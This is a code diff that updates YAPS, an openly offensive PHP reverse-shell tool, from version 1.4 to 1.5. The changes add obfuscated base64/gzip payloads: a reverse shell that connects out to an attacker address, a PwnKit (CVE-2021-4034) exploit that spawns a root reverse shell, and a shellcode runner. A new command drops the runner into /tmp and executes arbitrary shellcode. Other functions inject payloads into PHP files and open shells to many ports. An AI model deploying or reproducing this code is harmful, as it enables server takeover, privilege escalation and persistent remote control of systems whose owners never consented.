@@ -1,12 +1,12 @@
 <?php
 # YAPS - Yet Another PHP Shell
-# Version 1.4 - 04/02/22
+# Version 1.5 - 12/02/22
 # Made by Nicholas Ferreira
 # https://github.com/Nickguitar/YAPS
 
 
 //error_reporting(0);
-$version = "1.4";
+$version = "1.5";
 set_time_limit(0);
 ignore_user_abort(1);
 ini_set('max_execution_time', 0);
@@ -15,7 +15,7 @@ ini_set('default_socket_timeout', pow(99, 6)); //negative timeout value should s
 ########################## CONFIGS ############################
 
 $resources = array(
-"linpeas"   => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh",
+"linpeas"   => "https://github.com/carlospolop/PEASS-ng/releases/download/20220211/linpeas.sh",
 "linenum"   => "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
 "suggester" => "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
 "updateURL" => "https://raw.githubusercontent.com/Nickguitar/YAPS/main/yaps.php");
@@ -31,8 +31,36 @@ $salt = 'v_3_r_Y___G_o_0_d___s_4_L_t';
 $pass_hash = "f00945860424fa6148e329772c08e7d05d7fab6f69a4722b4c66c164acdb018ecc0cbc62060cc67e7ae962c65ab5967620622cc12206627229b94106b66db6b8"; // default: pass123
 $auto_verify_update = false; // if true, will check on every run for update
 $silent = false; //if true, does not display banner on connect
-
 if(isset($_GET['vrfy'])) die("baguvix"); //verification
+
+
+/*
+	This is a simple shellcode runner I've made in x64 nasm
+	
+	global _start
+	section .text
+	_start:
+		mov rsi, [rsp+16]	;argv[1]
+		jmp rsi
+		mov rax, 60 		;exit
+		mov rdi, 0			;code
+		syscall
+
+	Used in shellcode()
+	TODO: work on compatibility
+*/
+$shellcode_runner = base64_decode(gzuncompress(base64_decode("eJzt2LEOgjAQBuDdV3GQRDEuDncFCQkoJWCIm5GIxERG4tsbGihoMbq4mP8boPx3LZ3vbO3DuPCZJA34FBXEasncZtyXRfHUTS7Rjshp3lSTUEH7eO3rdAcsdeJUZJbbVWps1w36fpToKod9py5zbGfxlWvjVt+SHzsAAAAAAAAAAADg/7llkAspZ9PjImq+g5WKnTql4LatTvP4nnubkoRtHbKL9curCDXvVJNTbxAP5qc6S2iEOcTVqfP2pxzq41051jB66nryANMTv1U=")));
+
+/*
+	Modified php-reverse-shell (works w/ sudo, mysql, ftp, su, etc.) 
+	Used in stabilize()
+*/
+$payload_reverse = gzuncompress(base64_decode("eJydU11v2yAU/St3yGqM5Hw0qbpJliNN6sueVlV7ayKLYJhRCTAgy7Jp/31gnCZbHanrg22455x7z+XizFErjK9cy6Ss2Q9Gc7RvBW0hAQiXmTksBnBz8K1Wi0S4iAdY8Nx5K5nKs5QTL2/h6gpC0Gh3DBZIaQ9c71SDcFVxIh3DkDlPNkKKn8xWaLoRarohroUxFTBCk146QTD+RuEETxv2fap2Uo5QyUIeOLMQmsHL92+pH6WxFIWR2BptPRh/KMMzcYbsVb46GVwhPFj6jZ0H5f8XHj46VJ7Hg5HaMiMJZTlaKVQgVJzhYbTdXCu0U2TLYEzO1ajcbYl7ymeRpulTxeNbm9Aq+nRff7y7e0DF/eeHL0XGrFW6+4SKxaJT+KYi1pJDDjOolpDWyAjDgg2LcHH9MrwP4flgGOI1tJoy56r4rTsfyX5sqSmySHa45NoyQts87YE4yAyOI2FkWzvm640MbQj1NTCK4HQQiZ1GMFx1yfJ3nGmeghj/ygK/qUnfXaKmYo/X6+Nqvu5+DKHqv2hJijHwvRWe9SYfZ+uCR6inzWc3H/A/+lOBFzk6Ta9/pl3OMX9djvlzjt/AqdSuZ1064SPH4LIb0HGbhobLPxcZg50="));
+/*
+	Pwnkit priv esc exploit adapted from https://github.com/arthepsy/CVE-2021-4034/
+	Used in pwnkit()
+*/
+$cve_2021_4034 = gzuncompress(base64_decode("eJxtkWFv2jAQhj+PX/HKaEtghEz7NC2jEkJ0IEVtVOjUqamq1HGI1WBHccI8If777LBCuvVDorvnznf33vW5oEWTMnxTdcrlOL/o9buo4E+vWSO4wZbRPKkwVJig9470/6sTizcKdeGpUix2kqfYUCl27gD7Qxc8csFrSxWrG566nwaBsTYni50he6G/Vc22bkyYLmVVI5quFxO/UZVfSJoUvnri4mvHP7nnQGscXfMLUG3hVRmc77Prqx+PbcGxA0c7AYTMmxIvr/wyL/FzGq2wjBBd36zxISaDIBZMGxlmuAMJelzU2CZcuNZIqg0d4bhMY+/uH4xYXC7DOYZZgL9iyPY55RW88p8ZAtSyoflr6tu5aL6VKZKP+o3YqZgOwGgu4ZjcpmC4XV96X3wfd+bT+OzgAtpv7+AdM5QRg8zcPJMlEy7Rvh5TMgL51QbKykjK3MyA98pgZSEtpGJuNjiL2VCK9iU82RpKwlNmBSyFl0XLmS12XAm7fzDd9iDadmk1dOVYOFtMb1bz9eTOOqvFPAwnNvnqNgxxMAI1ozvmkvOJni0yGa5tMTQL39vcwwjM3Kf3Byq29mI="));
 
 ######################### END CONFIGS #########################
 
@@ -97,7 +125,8 @@ $commands = array(
 	"php",
 	"stabilize",
 	"suggester",
-	"pwnkit"
+	"pwnkit",
+	"shellcode"
 //	"upload"
 );
 
@@ -189,13 +218,13 @@ function help(){
   '.cyan('!color').'
   	Toggle $PS1 color (locally only)
   '.cyan('!duplicate').'
-  	Spawn another reverse shell
+  	Spawn a YAPS session to other ports
   '.cyan('!enum').'
   	Download Linpeas and Linenum to /tmp and get it ready to run
   '.cyan('!infect').'
   	Inject payloads into PHP files
   '.cyan('!info').'
-  	List information about target
+  	List information about the target
   './*cyan('!download <target file>').'
   	Downloads file from target to your PC
   '.cyan('!upload <source> <destination>').'
@@ -206,8 +235,10 @@ function help(){
   	Write and run PHP code on the remote host
   '.cyan('!pwnkit').'
   	Try to exploit CVE-2021-4034 and spawn a root reverse shell
+  '.cyan('!shellcode').'
+  	Send and run shellcode on the remote host
   '.cyan('!stabilize').'
-  	Stabilize to an interactive shell
+  	Spawn an interactive shell to other ports
   '.cyan('!suggester').'
   	Download Linux Exploit Suggester to /tmp and get it ready to run
   
@@ -415,14 +446,17 @@ function suggester(){
 function refresh_ps1($changecolor=false){
 	global $ps1_color,$ps1;
 	$user = str_replace(PHP_EOL, "", run_cmd("whoami"));
+	$ps1_user = $user."@".run_cmd("hostname");
+	$pwd = str_replace("/home/".$user, "~", run_cmd("pwd"));
+	$hostname = run_cmd("hostname");
 
 	if(!$ps1_color){
-		$ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",green($user."@".run_cmd("hostname")).":".cyan(run_cmd("pwd"))."$ "); // user@hostname:~$
-		if($user == "root") $ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",red($user."@".run_cmd("hostname")).":".cyan(run_cmd("pwd"))."# "); // root@hostname:~#
+		$ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",green($ps1_user).":".cyan($pwd)."$ "); // user@hostname:~$
+		if($user == "root") $ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",red($user."@".$hostname).":".cyan($pwd)."# "); // root@hostname:~#
 		if($changecolor) $ps1_color = true;
 	}else{
-		$ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",$user."@".run_cmd("hostname").":".run_cmd("pwd")."$ "); // user@hostname:~$
-		if($user == "root") $ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",$user."@".run_cmd("hostname").":".run_cmd("pwd")."# "); // root@hostname:~#
+		$ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",$ps1_color.":".$pwd."$ "); // user@hostname:~$
+		if($user == "root") $ps1 = white("[YAPS] ").str_replace(PHP_EOL,"",$user."@".$hostname.":".$pwd."# "); // root@hostname:~#
 		if($changecolor) $ps1_color = false;
 	}
 }
@@ -464,19 +498,15 @@ function runPHP($code){ // guess what
 
 // spawn an interactive shell
 function stabilize($post_socket=""){ 
-	global $s, $port, $ip;
-
-	// modified php-reverse-shell (works w/ sudo, mysql, ftp, su, etc.) 
-	$payload = "JHNjcmlwdD1zaGVsbF9leGVjKCJ3aGljaCBzY3JpcHQiKTskcHkzPXNoZWxsX2V4ZWMoIndoaWNoIHB5dGhvbjMiKTskcHk9c2hlbGxfZXhlYygid2hpY2ggcHl0aG9uIik7aWYoc3RybGVuKCRzY3JpcHQpPjYgJiYgc3RycG9zKCRzY3JpcHQsIm5vdCBmb3VuZCIpPT1mYWxzZSkgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCAtY2kgJyIuJHNjcmlwdC4iIC1xYyAvYmluL2Jhc2ggL2Rldi9udWxsJyI7ZWxzZSBpZihzdHJsZW4oJHB5Myk+NyAmJiBzdHJwb3MoJHNjcmlwdCwibm90IGZvdW5kIik9PWZhbHNlKSAkc3RhYmlsaXplcj0kcHkzLiIgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKFwiL2Jpbi9iYXNoXCIpJyI7ZWxzZSBpZihzdHJsZW4oJHB5KT42ICYmIHN0cnBvcygkc2NyaXB0LCJub3QgZm91bmQiKT09ZmFsc2UpICRzdGFiaWxpemVyPSRweS4iIC1jICdpbXBvcnQgcHR5O3B0eS5zcGF3bihcIi9iaW4vYmFzaFwiKSciO2Vsc2UgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCI7JHN0YWJpbGl6ZXI9c3RyX3JlcGxhY2UoIlxuIiwiIiwkc3RhYmlsaXplcik7JHNoZWxsPSJ1bmFtZSAtYTskc3RhYmlsaXplciI7dW1hc2soMCk7JHNvY2s9ZnNvY2tvcGVuKCJJUF9BRERSIixQT1JULCRlcnJubywkZXJyc3RyLDMwKTskc3RkPWFycmF5KCAwID0+IGFycmF5KCJwaXBlIiwiciIpLDEgPT4gYXJyYXkoInBpcGUiLCJ3IiksMiA9PiBhcnJheSgicGlwZSIsInciKSApOyRwcm9jZXNzPXByb2Nfb3Blbigkc2hlbGwsJHN0ZCwkcGlwZXMpO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBzdHJlYW1fc2V0X2Jsb2NraW5nKCRwLDApO3N0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssMCk7d2hpbGUoIWZlb2YoJHNvY2spKXskcmVhZF9hPWFycmF5KCRzb2NrLCRwaXBlc1sxXSwkcGlwZXNbMl0pO2lmKGluX2FycmF5KCRzb2NrLCRyZWFkX2EpKSBmd3JpdGUoJHBpcGVzWzBdLGZyZWFkKCRzb2NrLDIwNDgpKTtpZihpbl9hcnJheSgkcGlwZXNbMV0sJHJlYWRfYSkpIGZ3cml0ZSgkc29jayxmcmVhZCgkcGlwZXNbMV0sMjA0OCkpO2lmKGluX2FycmF5KCRwaXBlc1syXSwkcmVhZF9hKSkgZndyaXRlKCRzb2NrLGZyZWFkKCRwaXBlc1syXSwyMDQ4KSk7fSBmY2xvc2UoJHNvY2spO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBmY2xvc2UoJHApO3Byb2NfY2xvc2UoJHByb2Nlc3MpOw==";
-
+	global $s, $port, $ip, $payload_reverse;
+	
 	if(strlen($post_socket) > 1 && strlen($post_socket) > 0){ //if post_socket is set
-		echo $post_socket;
 		$skt = explode(":", $post_socket);
 		$post_ip = $skt[0];
 		$post_port = $skt[1];
 		// changes payload to add correct socket
-		$final_payload = base64_encode(str_replace("IP_ADDR", $post_ip, str_replace("PORT", $post_port, base64_decode($payload)))); 
-		shell_exec("echo ".$final_payload."| base64 -d | php -r '\$stdin=file(\"php://stdin\");eval(\$stdin[0]);'");
+		$final_payload = base64_encode(str_replace("IP_ADDR", $post_ip, str_replace("PORT", $post_port, $payload_reverse))); 
+		run_cmd("echo ".$final_payload."| base64 -d | php -r '\$stdin=file(\"php://stdin\");eval(\$stdin[0]);'");
 		return;
 	}
 
@@ -487,7 +517,7 @@ function stabilize($post_socket=""){
 			if($recv_port>65535 || $recv_port==0){
 				fwrite($s,red("[-]")." Port must be between 0-65535.\nChoose another port: ");
 			}else{
-				$final_payload = base64_encode(str_replace("IP_ADDR", $ip, str_replace("PORT", $recv_port, base64_decode($payload)))); // changes payload to add correct socket
+				$final_payload = base64_encode(str_replace("IP_ADDR", $ip, str_replace("PORT", $recv_port, $payload_reverse))); // changes payload to add correct socket
 				fwrite($s, yellow("[i]")." Trying to connect to $ip:$recv_port\n");
 				
 				if(isAvailable("popen") && isAvailable("pclose")){
@@ -624,7 +654,9 @@ function passwd(){
 function duplicate(){
 	global $s,$ip,$port,$_SERVER;
 
-	if(!isset($_SERVER["REQUEST_SCHEME"]) || !isset($_SERVER["HTTP_HOST"]) || !isset($_SERVER["REQUEST_URI"])){
+	//check if yaps was called via CLI or not
+	@$curl_url = $_SERVER["REQUEST_SCHEME"]."://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; // htt(p|ps) :// website.com /files/yaps.php
+	if(!$curl_url){
 		fwrite($s, yellow("[-] ")."Couldn't find YAPS URL. Did you run me via command line?\nPlease provide the correct YAPS URL (example.com/files/yaps.php): ");
 		while($yaps_url = fread($s, 256)){
 			if(get_request(preg_replace("/\n/", "",$yaps_url."?vrfy")) !== "baguvix")
@@ -632,42 +664,67 @@ function duplicate(){
 		break;
 		}
 		$curl_url = $yaps_url;
-	}else{
-		$curl_url = $_SERVER["REQUEST_SCHEME"]."://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; // htt(p|ps) :// website.com /files/yaps.php
-		echo $curl_url;
 	}
 
-	fwrite($s, cyan("[*] ")."Choose a port to listen (default: $port): ");
+	fwrite($s, cyan("[*] ").white("Choose the port(s) to receive the connection(s).\n    You can separate them with commas or specify ranges.\n    E.g.: 7359,8080,8085-8090\n(default: $port): "));
 
-	while($new_port = fread($s, 32)){
-		$new_port = (base64_encode($new_port) == "Cg==") ? $port: substr($new_port,0,-1); //if new_port= newline, new_port = old port
-		$socket = array('x' => $ip.":".$new_port);
-		fwrite($s, "Connecting to ".$ip.":".$new_port."\n");
-		$cmd = "wget -qO- --post-data=\"".http_build_query($socket)."\" $curl_url > /dev/null";
-		if(isAvailable("popen") && isAvailable("pclose"))
-			return pclose(popen($cmd." &",'r')); // doesn't wait for wget to return
-		return run_cmd("timeout --kill-after 0 1 ".$cmd); // thx znttfox =)
+	$new_port = fread($s, 32);
+	if(!preg_match("/^[0-9]+(\-[0-9]+|,[0-9]+(\-[0-9]+)*)*$/", $new_port))
+		return fwrite($s, red("[-] ").white("Wrong format. You can separate ports with commas or specify ranges.\n    E.g.: 7359,8080,8085-8090\n"));	
+
+	$new_port = (base64_encode($new_port) == "Cg==") ? $port : str_replace(" ", "", substr($new_port,0,-1)); //if new_port= newline, new_port = old port
+	
+	$port_list = array();
+
+	//if ports are comma separated
+	$comma_list = [$new_port];
+	if(strpos($new_port, ",") !== false)
+		$comma_list = explode(",", $new_port);
+
+	foreach($comma_list as $p){
+		//if there is some port range
+		if(strpos($p, "-") !== false){
+			$range = explode("-", $p);
+			for($i=(int)$range[0];$i<=(int)$range[1];$i++)
+				array_push($port_list, $i);
+			continue;
+		}
+		array_push($port_list, $p);
+	}
+	
+	$popen_pclose = false;
+
+	if(isAvailable("popen") && isAvailable("pclose")) $popen_pclose = true;
+	
+	//for each port, connect to it
+	foreach($port_list as $p){
+		$socket = array('x' => $ip.":".$p);
+		fwrite($s, green("[+] ").white("Connecting to ".$ip.":".$p."\n"));
+		$cmd = "nohup wget -qO- --post-data=\"".http_build_query($socket)."\" '$curl_url' & > /dev/null";
+		if($popen_pclose)
+			pclose(popen($cmd." &",'r')); // doesn't wait for wget to return
+		run_cmd("nohup timeout --kill-after 0 1 ".$cmd." &"); // thx znttfox =)
 	}
 }
 
 function get_request($url){ //todo: change download function
-	$response = false;
-	if(isAvailable("file_get_contents")){
-		$response = file_get_contents($url);
-	}elseif(isAvailable("fread") && isAvailable("fopen") && ini_get("allow_url_fopen")){
-		$response = fread(fopen($url, "r"),10);
-	}elseif(in_array("curl",get_loaded_extensions())){
+	if(isAvailable("file_get_contents"))
+		return file_get_contents($url);
+	elseif(isAvailable("fread") && isAvailable("fopen") && ini_get("allow_url_fopen"))
+		return fread(fopen($url, "r"),10);
+    	elseif($tmp_curl = run_cmd("curl -s ".$url))
+		return $tmp_curl;
+	elseif($tmp_wget = run_cmd("wget -qO- ".$url))
+		$response = $tmp_wget;
+	elseif(in_array("curl",get_loaded_extensions())){
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         $response = curl_exec($ch);
         curl_close($ch);
-    }elseif($tmp_curl = run_cmd("curl -s ".$url)){
-		$response = $tmp_curl;
-	}elseif($tmp_wget = run_cmd("wget -qO- ".$url)){
-		$response = $tmp_wget;
+        return $response;
     }
-	return $response;
+	return false;
 }
 
 //check if YAPS is up to date
@@ -839,7 +896,7 @@ function infect($allFiles,$fileArr,$payload_index,$payload_list,$position=1){
 
 //try to gain a reverse root shell with cve-2021-4034
 function pwnkit(){
-	global $ip, $s, $yaps;
+	global $ip, $s, $yaps, $cve_2021_4034;
 	
 	$port = "9090"; //port to which root shell will be sent
 	
@@ -861,14 +918,11 @@ function pwnkit(){
 		break;
 	}
 
-	// adapted from https://github.com/arthepsy/CVE-2021-4034/
-	$exploit = base64_decode("I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgpjaGFyICpzID0gCgkiI2luY2x1ZGUgPHN0ZGlvLmg+XG4jaW5jbHVkZSA8c3RkbGliLmg+XG4jaW5jbHVkZSA8dW5pc3RkLmg+XG52b2lkIGdjb252KCkge31cbnZvaWQgZ2NvbnZfaW5pdCgpIHtzZXR1aWQoMCk7c2V0Z2lkKDApO3NldGV1aWQoMCk7c2V0ZWdpZCgwKTtzeXN0ZW0oXCJleHBvcnQgUEFUSD0vdXNyL2xvY2FsL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9zYmluOi91c3IvYmluOi9zYmluOi9iaW47IHJtIC1yZiAnR0NPTlZfUEFUSD0uJyAneCc7IG5vaHVwIC91c3IvYmluL3BocCBZQVBTIElQIFBPUlQgJlwiKTtcbmV4aXQoMCk7fSI7CmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsgRklMRSAqZjsgc3lzdGVtKCJta2RpciAtcCAnR0NPTlZfUEFUSD0uJzsgdG91Y2ggJ0dDT05WX1BBVEg9Li94JzsgY2htb2QgYSt4ICdHQ09OVl9QQVRIPS4veCc7IG1rZGlyIC1wIHg7IGVjaG8gJ21vZHVsZSBVVEYtOC8vIFgvLyB4IDInID4geC9nY29udi1tb2R1bGVzIik7IGYgPSBmb3BlbigieC94LmMiLCAidyIpOyBmcHJpbnRmKGYsICIlcyIsIHMpOyBmY2xvc2UoZik7IHN5c3RlbSgiZ2NjIHgveC5jIC1vIHgveC5zbyAtc2hhcmVkIC1mUElDIik7IGNoYXIgKmVbXSA9IHsgIngiLCAiUEFUSD1HQ09OVl9QQVRIPS4iLCAiQ0hBUlNFVD1YIiwgIlNIRUxMPXgiLCBOVUxMIH07IGV4ZWN2ZSgiL3Vzci9iaW4vcGtleGVjIiwgKGNoYXIqW10pe05VTEx9LCBlKTt9Cg==");
+	$cve_2021_4034 = str_replace("YAPS", $yaps, $cve_2021_4034);
+	$cve_2021_4034 = str_replace("IP", $ip, $cve_2021_4034);
+	$cve_2021_4034 = str_replace("PORT", $new_port, $cve_2021_4034);
 
-	$exploit = str_replace("YAPS", $yaps, $exploit);
-	$exploit = str_replace("IP", $ip, $exploit);
-	$exploit = str_replace("PORT", $new_port, $exploit);
-
-	if(!file_put_contents("/tmp/xpl.c", $exploit))
+	if(!file_put_contents("/tmp/xpl.c", $cve_2021_4034))
 		return fwrite($s, red("[-] ")."Couldn't write exploit to /tmp. Do you have write permissions there?"); 
 
 	fwrite($s, white("~ Trying to compile exploit ~\n"));
@@ -887,6 +941,59 @@ function pwnkit(){
 	unlink("/tmp/xpl.c");
 	unlink("/tmp/xpl");
 	
+}
+
+//check whether shellcode is in a valid format
+function check_shellcode($shellcode){
+	if(strlen($shellcode) < 4)
+		return false;
+	if(preg_match_all("/^(\\\x([a-fA-F0-9]{2}))+$/", $shellcode))
+		return "hex encoded";
+	if(preg_match_all("/^([a-fA-F0-9]{2})+$/", $shellcode))
+		return "hex";
+	if(preg_match_all("/^(?=(.{4})*$)[A-Za-z0-9\+\/]*={0,2}$/", $shellcode))
+		return "base64";
+	return false;
+}
+
+//receive a shellcode from the user and execute it
+//TODO: compatibility w/ x86
+function shellcode(){
+	global $s, $shellcode_runner;
+	fwrite($s, cyan("[*] ").white("Send the shellcode you want to execute [max size: 16384 bytes (16kb)].\n"));
+	fwrite($s, yellow("[!] ").white("Your shellcode MUST NOT HAVE nullbytes (\\x00).\n    If you're using msfvenom, use -b \"\\x00\".\n    Interactive payloads won't display stdout nor stderr.\n"));
+	fwrite($s, cyan("[*] ").white("Accepted formats: \n    - Hex encoded (\\x48\\x31\\xc9\\x48\\x81\\xe9)\n    - Hex (4831c94881e9)\n    - Base64 hex encoded (SDHJSIHpCg==)\nEnter shellcode: "));
+	
+	$shellcode = fread($s, 16384);
+	$check = check_shellcode($shellcode);
+
+	fwrite($s, cyan("\n[*] ").white("Received payload in $check format.\n"));
+
+	if(!$check)
+		return fwrite($s, red("[-] ").white("Couldn't identify the format of the payload. Make sure it is in hex, encoded hex or base64(encoded hex) form.\n"));
+	if($check == "hex")
+		$shellcode = base64_encode(substr("\x".implode("\x",str_split($shellcode,2)),0,-3));
+	if($check == "hex encoded")
+		$shellcode = base64_encode($shellcode);
+
+	if(preg_match("/x00/", base64_decode($shellcode)))
+		return fwrite($s, red("[-] ").white("Make sure your shellcode DOES NOT contain any nullbyte (\\x00). If you're using msfvenom, use -b \"\\x00\".\n"));
+	
+	$randomName = random_name();
+	fwrite($s, cyan("[*] ").white("Dropping loader to /tmp/$randomName...\n"));
+
+	file_put_contents("/tmp/".$randomName, $shellcode_runner);
+	
+	fwrite($s, cyan("[*] ").white("Changing permissions for /tmp/$randomName...\n"));
+	if(!chmod("/tmp/".$randomName, 0777))
+		return fwrite($s, red("[-] ").white("Couldn't change permission for /tmp/$randomName.\n"));
+	
+	fwrite($s, green("[+] ").white("Running shellcode!\n"));
+	run_cmd("nohup /tmp/$randomName $($(which echo) -e $($(which echo) -n '$shellcode' | base64 -d)) 2>/dev/null &");
+	
+	fwrite($s, cyan("[*] ").white("Deleting loader at /tmp/$randomName...\n"));
+	if(!unlink("/tmp/$randomName"))
+		return fwrite($s, red("[-] ").white("Couldn't delete loader at /tmp/$randomName...\n"));
 }
 
 //guess what
@@ -937,6 +1044,9 @@ function parse_stdin($input){
 			break;
 		case "!pwnkit":
 			pwnkit();
+			break;
+		case "!shellcode":
+			shellcode();
 			break;
 	}	
 }
